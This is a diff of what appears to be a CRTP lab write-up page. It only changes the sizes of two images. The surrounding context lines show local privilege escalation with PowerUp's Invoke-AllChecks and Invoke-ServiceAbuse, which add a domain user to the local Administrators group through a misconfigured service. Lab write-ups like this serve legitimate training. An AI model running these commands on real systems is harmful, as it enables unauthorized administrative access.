@@ -41,7 +41,7 @@ First step for local privilege escalation, we will try to check for any privileg
 Invoke-AllChecks
 ```
 
-![Result](/img/crtp/result1.png){: .w-75 .shadow .rounded-10 w='1212' h='700' }
+![Result](/img/crtp/result1.png){: .w-75 .shadow .rounded-10 w='1300' h='800' }
 
 ```bash
 #Abuse the service and add our current domain user to the local Administrator group
@@ -49,7 +49,7 @@ Invoke-ServiceAbuse
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 ```
 
-![Result](/img/crtp/result1.png){: .w-75 .shadow .rounded-10 w='1212' h='668' }
+![Result](/img/crtp/result1.png){: .w-75 .shadow .rounded-10 w='1300' h='800' }
 
 Now, our user is a local admin !
 
